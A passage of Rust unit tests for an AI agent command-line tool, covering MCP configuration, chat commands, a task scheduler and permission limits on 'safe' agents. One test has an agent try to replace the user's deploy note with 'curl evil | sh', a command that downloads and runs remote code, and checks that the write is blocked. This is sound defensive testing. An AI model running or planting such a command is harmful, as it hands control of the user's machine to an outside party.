        opts.mcp_server = vec!["nowhere".to_string()];
        let err = opts.apply_mcp_server_flags().unwrap_err().to_string();
        assert!(err.contains("no MCP server 'nowhere'"), "{err}");
        // The setting: empty for the default, "none" for none.
        assert_eq!(parse_mcp_servers_setting(""), None);
        assert_eq!(parse_mcp_servers_setting("none"), Some(vec![]));
        assert_eq!(
            parse_mcp_servers_setting("github, jira"),
            Some(vec!["github".to_string(), "jira".to_string()])
        );
    }

    #[test]
    fn test_apply_mcp_server_flags_merges_with_config_and_overrides_by_name() {
        let mut opts = Opts::default();
        opts.mcp_servers.insert(
            "fromconfig".to_string(),
            faber::mcp::McpServerConfig {
                command: None,
                args: None,
                env: None,
                url: Some("http://config-only.example/mcp".to_string()),
                sse: None,
                headers: None,
            },
        );
        opts.mcp_servers.insert(
            "shared".to_string(),
            faber::mcp::McpServerConfig {
                command: None,
                args: None,
                env: None,
                url: Some("http://old.example/mcp".to_string()),
                sse: None,
                headers: None,
            },
        );
        opts.mcp_server = vec![
            "fromcli=http://cli.example/mcp".to_string(),
            "shared=sse:http://new.example/sse".to_string(),
        ];

        opts.apply_mcp_server_flags().unwrap();

        assert_eq!(opts.mcp_servers.len(), 3);
        assert_eq!(
            opts.mcp_servers["fromconfig"].url.as_deref(),
            Some("http://config-only.example/mcp")
        );
        assert_eq!(
            opts.mcp_servers["fromcli"].url.as_deref(),
            Some("http://cli.example/mcp")
        );
        // The CLI flag overrides the config file entry of the same name.
        assert_eq!(opts.mcp_servers["shared"].url, None);
        assert_eq!(
            opts.mcp_servers["shared"].sse.as_deref(),
            Some("http://new.example/sse")
        );
    }

    #[test]
    fn test_parse_parameters_number() {
        let params = parse_parameters(&["temperature=0.7".to_string()]).unwrap();
        assert_eq!(params["temperature"], serde_json::json!(0.7));
    }

    #[test]
    fn test_parse_parameters_integer() {
        let params = parse_parameters(&["count=42".to_string()]).unwrap();
        assert_eq!(params["count"], serde_json::json!(42.0));
    }

    #[test]
    fn test_parse_parameters_bool() {
        let params = parse_parameters(&["stream=true".to_string()]).unwrap();
        assert_eq!(params["stream"], serde_json::json!(true));
    }

    #[test]
    fn test_parse_parameters_null() {
        let params = parse_parameters(&["val=null".to_string()]).unwrap();
        assert_eq!(params["val"], serde_json::Value::Null);
    }

    #[test]
    fn test_parse_parameters_string() {
        let params = parse_parameters(&["name=hello world".to_string()]).unwrap();
        assert_eq!(params["name"], serde_json::json!("hello world"));
    }

    #[test]
    fn test_parse_parameters_nan_becomes_string() {
        let params = parse_parameters(&["val=NaN".to_string()]).unwrap();
        assert_eq!(params["val"], serde_json::json!("NaN"));
    }

    #[test]
    fn test_parse_parameters_infinity_becomes_string() {
        let params = parse_parameters(&["val=inf".to_string()]).unwrap();
        assert_eq!(params["val"], serde_json::json!("inf"));

        let params = parse_parameters(&["val=Infinity".to_string()]).unwrap();
        assert_eq!(params["val"], serde_json::json!("Infinity"));
    }

    #[test]
    fn test_parse_parameters_invalid_format() {
        let result = parse_parameters(&["noequals".to_string()]);
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_parameters_empty() {
        let params = parse_parameters(&[]).unwrap();
        assert!(params.is_empty());
    }

    #[test]
    fn test_parse_chat_command_help() {
        assert!(matches!(parse_chat_command("/help"), ChatCommand::Help));
    }

    #[test]
    fn test_parse_chat_command_quit() {
        assert!(matches!(parse_chat_command("/quit"), ChatCommand::Quit));
    }

    #[test]
    fn test_parse_chat_command_clear() {
        assert!(matches!(parse_chat_command("/clear"), ChatCommand::Clear));
    }

    #[test]
    fn test_parse_chat_command_show() {
        assert!(matches!(parse_chat_command("/show"), ChatCommand::Show));
    }

    #[test]
    fn test_parse_chat_command_limit() {
        match parse_chat_command("/limit 5") {
            ChatCommand::Limit(n) => assert_eq!(n, 5),
            _ => panic!("expected Limit"),
        }
    }

    #[test]
    fn test_parse_chat_command_limit_invalid() {
        assert!(matches!(
            parse_chat_command("/limit abc"),
            ChatCommand::Invalid(_)
        ));
    }

    #[test]
    fn test_parse_chat_command_backtrace() {
        match parse_chat_command("/backtrace 3") {
            ChatCommand::Backtrace(n) => assert_eq!(n, 3),
            _ => panic!("expected Backtrace"),
        }
    }

    #[test]
    fn test_parse_chat_command_system() {
        match parse_chat_command("/system be nice") {
            ChatCommand::System(msg) => assert_eq!(msg, "be nice"),
            _ => panic!("expected System"),
        }
    }

    #[test]
    fn test_parse_chat_command_agents() {
        assert!(matches!(parse_chat_command("/agents"), ChatCommand::Agents));
    }

    #[test]
    fn test_parse_chat_command_create_agent() {
        match parse_chat_command("/create-agent bob") {
            ChatCommand::CreateAgent(name) => assert_eq!(name, "bob"),
            _ => panic!("expected CreateAgent"),
        }
    }

    #[test]
    fn test_parse_chat_command_select_agent() {
        match parse_chat_command("/select-agent bob") {
            ChatCommand::SelectAgent(name) => assert_eq!(name, "bob"),
            _ => panic!("expected SelectAgent"),
        }
    }

    #[test]
    fn test_parse_chat_command_delete_agent() {
        match parse_chat_command("/delete-agent bob") {
            ChatCommand::DeleteAgent(name) => assert_eq!(name, "bob"),
            _ => panic!("expected DeleteAgent"),
        }
    }

    #[test]
    fn test_parse_chat_command_mcp_refresh() {
        assert!(matches!(
            parse_chat_command("/mcp-refresh"),
            ChatCommand::McpRefresh
        ));
    }

    #[test]
    fn test_parse_chat_command_tools() {
        assert!(matches!(parse_chat_command("/tools"), ChatCommand::Tools));
    }

    #[test]
    fn test_parse_chat_command_chdir() {
        match parse_chat_command("/chdir ../other-project") {
            ChatCommand::Chdir(path) => assert_eq!(path, "../other-project"),
            _ => panic!("expected Chdir"),
        }
    }

    #[test]
    fn test_parse_chat_command_chdir_trims_whitespace() {
        match parse_chat_command("/chdir   src/main  ") {
            ChatCommand::Chdir(path) => assert_eq!(path, "src/main"),
            _ => panic!("expected Chdir"),
        }
    }

    #[test]
    fn test_parse_chat_command_chdir_requires_a_path() {
        assert!(matches!(
            parse_chat_command("/chdir"),
            ChatCommand::Invalid(_)
        ));
        assert!(matches!(
            parse_chat_command("/chdir "),
            ChatCommand::Invalid(_)
        ));
    }

    #[test]
    fn test_parse_chat_command_pwd() {
        assert!(matches!(parse_chat_command("/pwd"), ChatCommand::Pwd));
    }

    #[test]
    fn test_parse_chat_command_plan() {
        assert!(matches!(parse_chat_command("/plan"), ChatCommand::Plan));
    }

    fn plan_item(content: &str, status: PlanStatus) -> PlanItem {
        PlanItem {
            content: content.to_string(),
            status,
        }
    }

    #[test]
    fn test_plan_item_json_uses_snake_case_status() {
        let items: Vec<PlanItem> =
            serde_json::from_str(r#"[{"content": "a", "status": "in_progress"}]"#).unwrap();
        assert_eq!(items, vec![plan_item("a", PlanStatus::InProgress)]);
    }

    #[test]
    fn test_validate_plan_rejects_two_in_progress_and_empty_content() {
        assert!(
            validate_plan(&[
                plan_item("a", PlanStatus::InProgress),
                plan_item("b", PlanStatus::InProgress),
            ])
            .is_err()
        );
        assert!(validate_plan(&[plan_item("  ", PlanStatus::Pending)]).is_err());
        assert!(
            validate_plan(&[
                plan_item("a", PlanStatus::Completed),
                plan_item("b", PlanStatus::InProgress),
                plan_item("c", PlanStatus::Pending),
            ])
            .is_ok()
        );
    }

    #[test]
    fn test_plan_summary_shows_progress_and_current_item() {
        let items = [
            plan_item("a", PlanStatus::Completed),
            plan_item("b", PlanStatus::InProgress),
            plan_item("c", PlanStatus::Pending),
        ];
        assert_eq!(plan_summary(&items).as_deref(), Some("Plan 1/3: b"));
    }

    #[test]
    fn test_plan_summary_falls_back_to_next_pending() {
        let items = [
            plan_item("a", PlanStatus::Completed),
            plan_item("b", PlanStatus::Pending),
        ];
        assert_eq!(plan_summary(&items).as_deref(), Some("Plan 1/2: b"));
    }

    #[test]
    fn test_plan_summary_none_when_empty_or_finished() {
        assert_eq!(plan_summary(&[]), None);
        assert_eq!(plan_summary(&[plan_item("a", PlanStatus::Completed)]), None);
    }

    #[test]
    fn test_format_plan_marks_each_status() {
        let items = [
            plan_item("a", PlanStatus::Completed),
            plan_item("b", PlanStatus::InProgress),
            plan_item("c", PlanStatus::Pending),
        ];
        assert_eq!(format_plan(&items), vec!["[x] a", "[>] b", "[ ] c"]);
    }

    fn tool_message(content: &str) -> Message {
        make_message("tool", content.to_string())
    }

    #[test]
    fn test_task_outcome_from_run_command_result() {
        let msg = tool_message(
            r#"{"stdout":"built\n","stderr":"warning: x\n","exit_code":0,"success":true}"#,
        );
        let outcome = task_outcome(Some(&msg));
        assert!(outcome.succeeded);
        assert_eq!(outcome.exit_code, Some(0));
        assert_eq!(outcome.result, "built\n\nwarning: x");

        let msg = tool_message(r#"{"stdout":"","stderr":"boom","exit_code":2,"success":false}"#);
        let outcome = task_outcome(Some(&msg));
        assert!(!outcome.succeeded);
        assert_eq!(outcome.exit_code, Some(2));
    }

    #[test]
    fn test_task_outcome_from_other_tools_and_bad_commands() {
        assert!(task_outcome(Some(&tool_message("[\"Cargo.toml\"]"))).succeeded);
        let failed = task_outcome(Some(&tool_message("error: tool 'x' failed: nope")));
        assert!(!failed.succeeded);
        assert_eq!(failed.result, "error: tool 'x' failed: nope");
        let invalid = task_outcome(None);
        assert!(!invalid.succeeded);
        assert!(invalid.result.contains("isn't a"), "{}", invalid.result);
    }

    #[test]
    fn test_scheduled_task_runs_and_records_its_outcome() {
        let db: Arc<dyn DbBackend> = Arc::new(LocalDb::new(test_db_conn()));
        db.create_agent("a", "").unwrap();
        assert!(db.claim_agent("a", "session").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let good = db
            .create_oneshot_task(
                "good",
                "",
                &past,
                r#"{"tool":"glob","arguments":{"pattern":"Cargo.toml"}}"#,
                None,
            )
            .unwrap();
        // An empty command (and description) can't be run at all.
        let bad = db.create_oneshot_task("bad", "", &past, "", None).unwrap();
        let tools = Arc::new(ToolTaskTools::new(&Opts::default()));
        let (tx, rx) = mpsc::channel();

        for id in [good, bad] {
            assert!(db.claim_task(id, "session").unwrap());
            let task = db.get_task(id).unwrap().unwrap();
            run_scheduled_task(task, db.clone(), "session", tools.clone(), tx.clone());
        }

        let good = db.get_task(good).unwrap().unwrap();
        assert_eq!(good.status, db::TaskStatus::DONE);
        assert_eq!(good.last_outcome.as_deref(), Some("succeeded"));
        assert!(good.last_result.unwrap().contains("Cargo.toml"));
        let bad = db.get_task(bad).unwrap().unwrap();
        assert_eq!(bad.status, db::TaskStatus::DONE);
        assert_eq!(bad.last_outcome.as_deref(), Some("failed"));
        // Only the real tool call produced a message for the agent's chat.
        assert_eq!(rx.try_iter().count(), 1);
    }

    fn tool_task(db: &dyn DbBackend, command: &str, run_safe: bool, cwd: Option<&str>) -> i64 {
        db.create_task(&db::NewTask {
            name: "t".to_string(),
            description: String::new(),
            kind: db::TaskKind::TOOL.to_string(),
            command: command.to_string(),
            agent_name: Some("a".to_string()),
            schedule: db::TaskSchedule::Once {
                at: (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339(),
            },
            held: false,
            depends_on: Vec::new(),
            profile: None,
            run_safe,
            cwd: cwd.map(String::from),
        })
        .unwrap()
    }

    #[test]
    fn test_a_tool_task_runs_where_its_task_does_and_a_safe_ones_stays_out_of_histories() {
        let db: Arc<dyn DbBackend> = Arc::new(LocalDb::new(test_db_conn()));
        db.create_agent("a", "").unwrap();
        let dir = TempTestDir::new("tool_task_cwd");
        std::fs::write(dir.0.join("here.txt"), "inside\n").unwrap();
        let read = r#"{"tool":"read_file","arguments":{"path":"here.txt"}}"#;
        let tools = Arc::new(ToolTaskTools::new(&Opts::default()));
        let (tx, rx) = mpsc::channel();
        for run_safe in [false, true] {
            let id = tool_task(db.as_ref(), read, run_safe, dir.0.to_str());
            assert!(db.claim_task(id, "session").unwrap());
            let task = db.get_task(id).unwrap().unwrap();
            run_scheduled_task(task, db.clone(), "session", tools.clone(), tx.clone());
            let task = db.get_task(id).unwrap().unwrap();
            assert!(
                task.last_result.as_deref().unwrap_or("").contains("inside"),
                "read in the task's directory: {:?}",
                task.last_result
            );
        }
        // Only the user's task's call went to its agent's conversation.
        assert_eq!(rx.try_iter().count(), 1);
    }

    #[test]
    fn test_a_safe_agents_tool_task_acts_as_no_agent() {
        let db: Arc<dyn DbBackend> = Arc::new(LocalDb::new(test_db_conn()));
        db.create_agent("a", "").unwrap();
        db.create_agent("default", "").unwrap();
        let tools = Arc::new(ToolTaskTools::new(&Opts::default()));
        let (tx, _rx) = mpsc::channel();
        let run = |command: &str| {
            let id = tool_task(db.as_ref(), command, true, None);
            assert!(db.claim_task(id, "session").unwrap());
            let task = db.get_task(id).unwrap().unwrap();
            run_scheduled_task(task, db.clone(), "session", tools.clone(), tx.clone());
            (id, db.get_task(id).unwrap().unwrap())
        };
        // No message as "default", or anyone.
        let (_, task) = run(r#"{"tool":"send_message","arguments":{"to":"a","message":"hi"}}"#);
        assert_eq!(task.last_outcome.as_deref(), Some("failed"));
        assert!(task.last_result.unwrap().contains("isn't one"));
        // And what it writes is its own, not taken for the user's.
        let (id, _) = run(r#"{"tool":"kb_write","arguments":{"title":"t","body":"b"}}"#);
        let note = db
            .kb_get_by_title("t", &db::KbViewer::User)
            .unwrap()
            .unwrap();
        assert_eq!(note.created_by, Some(format!("task #{}", id)));
    }

    #[test]
    fn test_a_safe_agent_keeps_to_its_own_tasks_and_tools() {
        let db = local_db_with_agents(&["boss", "a"]);
        let ctx = chat_ctx(db.clone(), "boss");
        // The user's task: neither enabled, moved nor deleted by it, and
        // what it runs and returned is hidden.
        let user_task = tool_task(
            db.as_ref(),
            r#"{"tool":"glob","arguments":{}}"#,
            false,
            None,
        );
        db.set_task_enabled(user_task, false).unwrap();
        db.finish_task(
            user_task,
            "none",
            &db::TaskOutcome {
                succeeded: true,
                exit_code: None,
                result: "secret output".to_string(),
            },
        )
        .unwrap();
        let call = |f: ToolCallback, params: serde_json::Value| f(&params.to_string(), &ctx);
        for (f, params) in [
            (
                tool_task_set_enabled as ToolCallback,
                serde_json::json!({"id": user_task, "enabled": true}),
            ),
            (
                tool_task_assign,
                serde_json::json!({"id": user_task, "agent_name": "boss"}),
            ),
            (tool_task_delete, serde_json::json!({"id": user_task})),
        ] {
            let err = call(f, params).unwrap_err().to_string();
            assert!(err.contains("can't change it"), "{err}");
        }
        assert!(db.get_task(user_task).unwrap().is_some());
        let shown = call(tool_task_list, serde_json::json!({"id": user_task})).unwrap();
        assert!(
            !shown.contains("glob") && !shown.contains("secret output"),
            "{shown}"
        );
        // Its own: it may.
        let own = tool_task(db.as_ref(), r#"{"tool":"glob","arguments":{}}"#, true, None);
        call(tool_task_delete, serde_json::json!({"id": own})).unwrap();

        // A tool task only runs a tool its maker has.
        let mut config = db.get_agent_config("boss").unwrap();
        config.tools = Some(vec!["read_file".to_string(), "task_create".to_string()]);
        db.set_agent_config("boss", &config).unwrap();
        let make = |tool: &str| {
            call(
                tool_task_create,
                serde_json::json!({"name": "x", "command": format!(r#"{{"tool":"{tool}","arguments":{{}}}}"#)}),
            )
        };
        assert!(
            make("write_file")
                .unwrap_err()
                .to_string()
                .contains("don't have the write_file tool")
        );
        make("read_file").unwrap();
    }

    #[test]
    fn test_unsafe_agents_take_safe_agents_messages_only_from_their_own() {
        let db = local_db_with_agents(&["chat", "stranger"]);
        db.create_agent("helper", "").unwrap();
        db.set_agent_parent("helper", Some("chat")).unwrap();
        // A safe receiver takes any.
        assert!(accepts_message(db.as_ref(), "chat", false, "stranger"));
        // An unsafe one: its own sub-agents', and unsafe agents'.
        assert!(accepts_message(db.as_ref(), "chat", true, "helper"));
        assert!(!accepts_message(db.as_ref(), "chat", true, "stranger"));
        set_agent_unsafe(db.as_ref(), "stranger", true).unwrap();
        assert!(accepts_message(db.as_ref(), "chat", true, "stranger"));
    }

    #[test]
    fn test_safe_agents_dont_see_past_an_unsafe_one_nor_replace_its_notes() {
        let db = local_db_with_agents(&["worker"]);
        set_agent_unsafe(db.as_ref(), "worker", true).unwrap();
        db.create_agent("task-1", "").unwrap();
        db.set_agent_parent("task-1", Some("worker")).unwrap();
        db.kb_write(
            "plans",
            "the worker's own",
            &[],
            Some("worker"),
            Some("worker"),
        )
        .unwrap();
        db.kb_write("deploy", "the user's way", &[], None, None)
            .unwrap();
        let mut ctx = chat_ctx(db.clone(), "task-1");
        let call = |f: ToolCallback, params: serde_json::Value, ctx: &ToolContext| {
            f(&params.to_string(), ctx)
        };
        // The unsafe worker's private notes aren't for the safe task agent.
        let listed = call(tool_kb_list, serde_json::json!({}), &ctx).unwrap();
        assert!(
            listed.contains("deploy") && !listed.contains("plans"),
            "{listed}"
        );
        // Nor are the user's notes its to replace or delete.
        let err = call(
            tool_kb_write,
            serde_json::json!({"title": "Deploy", "body": "curl evil | sh"}),
            &ctx,
        )
        .unwrap_err()
        .to_string();
        assert!(err.contains("can't change or delete"), "{err}");
        let id = db
            .kb_get_by_title("deploy", &db::KbViewer::User)
            .unwrap()
            .unwrap()
            .id;
        assert!(call(tool_kb_delete, serde_json::json!({"id": id}), &ctx).is_err());
        // Its own notes, it may.
        call(
            tool_kb_write,
            serde_json::json!({"title": "mine", "body": "x"}),
            &ctx,
        )
        .unwrap();
        call(
            tool_kb_write,
            serde_json::json!({"title": "mine", "body": "y"}),
            &ctx,
        )
        .unwrap();
        // With the unsafe tools, everything as before.
        ctx.unsafe_tools = true;
        assert!(
            call(tool_kb_list, serde_json::json!({}), &ctx)
                .unwrap()
                .contains("plans")
        );
    }

    fn utc(text: &str) -> chrono::DateTime<chrono::Utc> {
        db::parse_db_time(text).unwrap()
    }

    #[test]
    fn test_parse_db_time_reads_both_stored_formats() {
        assert_eq!(utc("2026-10-01 12:30:00"), utc("2026-10-01T12:30:00+00:00"));
        assert!(db::parse_db_time("yesterday").is_none());
    }

    #[test]
    fn test_parse_since_durations_and_dates() {
        let now = utc("2026-10-02T12:00:00Z");
        assert_eq!(
            parse_since("30m", now).unwrap(),
            utc("2026-10-02T11:30:00Z")
        );
        assert_eq!(parse_since("2h", now).unwrap(), utc("2026-10-02T10:00:00Z"));
        assert_eq!(parse_since("3d", now).unwrap(), utc("2026-09-29T12:00:00Z"));
        assert_eq!(parse_since("1w", now).unwrap(), utc("2026-09-25T12:00:00Z"));
        assert_eq!(
            parse_since("2026-10-01T08:00:00Z", now).unwrap(),
            utc("2026-10-01T08:00:00Z")
        );
        // Plain dates and times are local.
        let local_midnight = chrono::NaiveDate::from_ymd_opt(2026, 10, 1)
            .unwrap()
            .and_hms_opt(0, 0, 0)
            .unwrap()
            .and_local_timezone(chrono::Local)
            .unwrap()
            .with_timezone(&chrono::Utc);
        assert_eq!(parse_since("2026-10-01", now).unwrap(), local_midnight);
        assert!(parse_since("2026-10-01 14:00", now).is_ok());
        assert!(parse_since("soon", now).is_err());
        assert!(parse_since("5y", now).is_err());
    }

    #[test]
    fn test_format_relative() {
        let now = utc("2026-10-02T12:00:00Z");
        assert_eq!(format_relative(utc("2026-10-02T12:00:02Z"), now), "now");
        assert_eq!(format_relative(utc("2026-10-02T12:05:00Z"), now), "in 5m");
        assert_eq!(format_relative(utc("2026-10-02T09:00:00Z"), now), "3h ago");
        assert_eq!(format_relative(utc("2026-09-30T12:00:00Z"), now), "2d ago");
        assert_eq!(format_relative(utc("2026-10-02T11:59:30Z"), now), "30s ago");
    }

    fn task_row(id: i64, created: &str, last_run: Option<&str>) -> db::TaskRow {
        db::TaskRow {
            id,
            agent_name: None,
            name: format!("t{}", id),
            description: String::new(),
            task_type: "oneshot".to_string(),
            cron_expression: None,
            run_at: Some(created.to_string()),
            next_run_at: Some(created.to_string()),
            last_run_at: last_run.map(String::from),
            status: "scheduled".to_string(),
            created_at: created.to_string(),
            command: String::new(),
            max_runs: None,
            run_count: 0,
            claimed_by: None,
            started_at: None,
            last_outcome: None,
            last_exit_code: None,
            last_result: None,
            kind: "tool".to_string(),
            depends_on: Vec::new(),
            profile: None,
            run_safe: false,
            cwd: None,
            stop_requested: false,
        }
    }

    #[test]
    fn test_select_tasks_orders_by_activity_and_filters() {
        let tasks = vec![
            task_row(1, "2026-09-01 10:00:00", Some("2026-10-02T11:00:00Z")),
            task_row(2, "2026-10-01 10:00:00", None),
            task_row(3, "2026-09-20 10:00:00", None),
        ];
        let ids = |tasks: Vec<db::TaskRow>| tasks.iter().map(|t| t.id).collect::<Vec<_>>();
        assert_eq!(ids(select_tasks(tasks.clone(), None, None)), vec![1, 2, 3]);
        assert_eq!(ids(select_tasks(tasks.clone(), None, Some(2))), vec![1, 2]);
        let since = Some(utc("2026-09-30T00:00:00Z"));
        assert_eq!(ids(select_tasks(tasks, since, None)), vec![1, 2]);
    }

    fn add_args(args: &[&str]) -> TasksAction {
        let mut argv = vec!["faber", "tasks", "add"];
        argv.extend_from_slice(args);
        match Opts::try_parse_from(argv).unwrap().command {
            CliCommand::Tasks {
                action: Some(action),
                ..
            } => action,
            other => panic!("not tasks add: {:?}", other),
        }
    }

    #[test]
    fn test_tasks_add_builds_prompt_and_tool_tasks() {
        let now = utc("2026-10-02T12:00:00Z");
        let task = new_task_from_cli(&add_args(&["Tell me a joke", "--in", "30s"]), now).unwrap();
        assert_eq!(task.kind, "prompt");
        assert_eq!(task.name, "Tell me a joke");
        assert_eq!(task.agent_name, None);
        assert_eq!(
            task.schedule,
            db::TaskSchedule::Once {
                at: "2026-10-02T12:00:30+00:00".to_string()
            }
        );

        let task = new_task_from_cli(
            &add_args(&[
                "triage",
                "--cron",
                "0 0 9 * * * *",
                "--max-runs",
                "3",
                "--agent",
                "bot",
            ]),
            now,
        )
        .unwrap();
        assert_eq!(task.agent_name.as_deref(), Some("bot"));
        assert!(matches!(
            task.schedule,
            db::TaskSchedule::Cron {
                max_runs: Some(3),
                ..
            }
        ));

        let task = new_task_from_cli(
            &add_args(&[
                "--tool",
                r#"{"tool":"glob","arguments":{"pattern":"*.md"}}"#,
            ]),
            now,
        )
        .unwrap();
        assert_eq!(task.kind, "tool");
        assert_eq!(task.name, "glob");
        assert_eq!(
            task.schedule,
            db::TaskSchedule::Once {
                at: now.to_rfc3339()
            }
        );
    }

    #[test]
    fn test_tasks_add_hold_and_hold_release_commands_parse() {
        let now = utc("2026-10-02T12:00:00Z");
        let task = new_task_from_cli(&add_args(&["later", "--hold"]), now).unwrap();
        assert!(task.held);
        assert!(!new_task_from_cli(&add_args(&["now"]), now).unwrap().held);
        match Opts::try_parse_from(["faber", "tasks", "hold", "3", "4"])
            .unwrap()
            .command
        {
            CliCommand::Tasks {
                action: Some(TasksAction::Hold { ids }),
                ..
            } => assert_eq!(ids, vec![3, 4]),
            other => panic!("{:?}", other),
        }
        assert!(
            Opts::try_parse_from(["faber", "tasks", "release"]).is_err(),
            "needs an id"
        );
    }

    #[test]
    fn test_board_marks_held_tasks() {
        let now = utc("2026-10-02T12:00:00Z");
        let held = board_task(1, "held", "prompt", "2026-10-02T11:00:00Z");
        let board = render_board(&[held], &HashMap::new(), now, 120, false);
        assert!(board.starts_with("SCHEDULED (1)"), "{board}");
        assert!(board.contains("✋ on hold"), "{board}");
    }

    #[test]
    fn test_tasks_add_after_and_unmet_dependencies() {
        let now = utc("2026-10-02T12:00:00Z");
        let task =
            new_task_from_cli(&add_args(&["deploy", "--after", "3", "--after", "4"]), now).unwrap();
        assert_eq!(task.depends_on, vec![3, 4]);

        let mut done_ok = task_row(3, "2026-10-01 10:00:00", None);
        done_ok.status = "done".to_string();
        done_ok.last_outcome = Some("succeeded".to_string());
        let mut running = task_row(4, "2026-10-01 10:00:00", None);
        running.status = "running".to_string();
        let mut waiting = task_row(5, "2026-10-01 10:00:00", None);
        waiting.depends_on = vec![3, 4, 99];
        let all = vec![done_ok, running, waiting];
        let blocked = db::unmet_dependencies(&all);
        assert_eq!(
            blocked.get(&5),
            Some(&vec![4, 99]),
            "#3 is met; #99 doesn't exist"
        );
        assert!(!blocked.contains_key(&3));
        let board = render_board(&all, &blocked, now, 120, false);
        assert!(board.contains("after #4, #99"), "{board}");
    }

    #[test]
    fn test_tasks_add_rejects_bad_input() {
        let now = utc("2026-10-02T12:00:00Z");
        assert!(new_task_from_cli(&add_args(&["x", "--in", "soon"]), now).is_err());
        assert!(new_task_from_cli(&add_args(&["x", "--at", "tomorrow"]), now).is_err());
        assert!(new_task_from_cli(&add_args(&["--tool", "glob *.md"]), now).is_err());
        assert!(new_task_from_cli(&add_args(&["--tool", r#"{"pattern":"x"}"#]), now).is_err());
        assert!(new_task_from_cli(&add_args(&["  "]), now).is_err());
        // Conflicting schedules and --max-runs without --cron are rejected
        // by the argument parser itself.
        for argv in [
            vec![
                "faber",
                "tasks",
                "add",
                "x",
                "--in",
                "1m",
                "--at",
                "2026-10-03",
            ],
            vec![
                "faber",
                "tasks",
                "add",
                "x",
                "--in",
                "1m",
                "--cron",
                "* * * * * * *",
            ],
            vec!["faber", "tasks", "add", "x", "--max-runs", "2"],
        ] {
            assert!(Opts::try_parse_from(argv).is_err());
        }
    }

    #[test]
    fn test_prompt_tasks_go_to_matching_idle_agents_only() {
        let db: Arc<dyn DbBackend> = Arc::new(LocalDb::new(test_db_conn()));
        for (agent, session) in [("alice", "s1"), ("bob", "s2")] {
            db.create_agent(agent, "").unwrap();
            assert!(db.claim_agent(agent, session).unwrap());
        }
        let past = (chrono::Utc::now() - chrono::Duration::seconds(1)).to_rfc3339();
        let prompt = |agent: Option<&str>| db::NewTask {
            name: "p".to_string(),
            description: String::new(),
            kind: "prompt".to_string(),
            command: "say hi".to_string(),
            agent_name: agent.map(String::from),
            schedule: db::TaskSchedule::Once { at: past.clone() },
            held: false,
            depends_on: Vec::new(),
            profile: None,
            run_safe: false,
            cwd: None,
        };
        let for_bob = db.create_task(&prompt(Some("bob"))).unwrap();
        assert!(claim_prompt_task(db.as_ref(), "s1", "alice", &[]).is_none());
        assert_eq!(
            claim_prompt_task(db.as_ref(), "s2", "bob", &[]).unwrap().id,
            for_bob
        );

        let for_anyone = db.create_task(&prompt(None)).unwrap();
        assert_eq!(
            claim_prompt_task(db.as_ref(), "s1", "alice", &[])
                .unwrap()
                .id,
            for_anyone
        );
        assert!(
            claim_prompt_task(db.as_ref(), "s2", "bob", &[]).is_none(),
            "already taken"
        );

        assert!(
            db.create_task(&prompt(Some("carol")))
                .unwrap_err()
                .to_string()
                .contains("no agent named")
        );
    }

    #[test]
    fn test_prompt_task_outcome() {
        let err: Box<dyn Error> = "boom".into();
        let failed = prompt_task_outcome(Err(&err));
        assert!(!failed.succeeded);
        assert_eq!(failed.result, "boom");
    }

    fn board_task(id: i64, status: &str, kind: &str, next: &str) -> db::TaskRow {
        let mut t = task_row(id, "2026-10-01 10:00:00", None);
        t.status = status.to_string();
        t.kind = kind.to_string();
        t.next_run_at = Some(next.to_string());
        t
    }

    #[test]
    fn test_board_puts_each_task_in_its_column() {
        let now = utc("2026-10-02T12:00:00Z");
        let mut done = board_task(4, "done", "tool", "2026-10-02T11:00:00Z");
        done.last_outcome = Some("failed".to_string());
        done.last_result = Some("exit status 2".to_string());
        done.last_run_at = Some("2026-10-02T11:00:00Z".to_string());
        let tasks = vec![
            board_task(1, "scheduled", "tool", "2026-10-02T13:00:00Z"),
            board_task(2, "scheduled", "prompt", "2026-10-02T11:59:00Z"),
            board_task(3, "running", "prompt", "2026-10-02T11:00:00Z"),
            done,
            board_task(5, "disabled", "tool", "2026-10-02T13:00:00Z"),
            // A due tool task isn't waiting for an agent: the scheduler runs it.
            board_task(6, "scheduled", "tool", "2026-10-02T11:59:00Z"),
        ];
        let board = render_board(&tasks, &HashMap::new(), now, 120, false);
        let lines: Vec<&str> = board.lines().collect();
        assert!(lines[0].starts_with("SCHEDULED (3)"), "{board}");
        assert!(lines[0].contains("WAITING (1)") && lines[0].contains("RUNNING (1)"));
        assert!(lines[0].contains("DONE (1)"));
        // Every card's first line is in its column: find each "#N" offset.
        let column_of = |id: &str| {
            let line = lines.iter().find(|l| l.contains(id)).unwrap();
            line.find(id).unwrap() / 30
        };
        assert_eq!(column_of("#1 "), 0);
        assert_eq!(column_of("#5 "), 0);
        assert_eq!(column_of("#6 "), 0);
        assert_eq!(column_of("#2 "), 1);
        assert_eq!(column_of("#3 "), 2);
        assert_eq!(column_of("#4 "), 3);
        assert!(board.contains("⏸ disabled"));
        assert!(board.contains("✗ 1h ago"));
        assert!(board.contains("exit status 2"));
        assert!(board.contains("due 1m ago · for any"), "{board}");
        for line in &lines {
            assert!(console::measure_text_width(line) <= 120, "too wide: {line}");
        }
    }

    #[test]
    fn test_board_caps_long_columns_and_keeps_width_with_colors() {
        let now = utc("2026-10-02T12:00:00Z");
        let tasks: Vec<db::TaskRow> = (1..=13)
            .map(|id| {
                let mut t = board_task(id, "done", "tool", "2026-10-02T11:00:00Z");
                t.last_outcome = Some("succeeded".to_string());
                t.name = "a rather long task name that won't fit".to_string();
                t
            })
            .collect();
        let board = render_board(&tasks, &HashMap::new(), now, 90, true);
        assert!(board.contains("+3 more"), "{board}");
        let widths: Vec<usize> = board
            .lines()
            .filter(|l| l.contains('│'))
            .map(console::measure_text_width)
            .collect();
        assert!(
            widths.windows(2).all(|w| w[0] == w[1]),
            "cards are ragged: {widths:?}"
        );
    }

    #[test]
    fn test_describe_task_shows_every_field_in_full() {
        let now = utc("2026-10-02T12:00:00Z");
        let mut task = task_row(7, "2026-10-01 10:00:00", Some("2026-10-02T11:00:00Z"));
        task.name = "nightly".to_string();
        task.kind = "prompt".to_string();
        task.status = "scheduled".to_string();
        task.cron_expression = Some("0 0 3 * * * *".to_string());
        task.next_run_at = Some("2026-10-03T03:00:00Z".to_string());
        task.run_count = 2;
        task.max_runs = Some(5);
        task.last_outcome = Some("failed".to_string());
        task.last_exit_code = Some(2);
        task.command = "Summarize the day.\nKeep it short.".to_string();
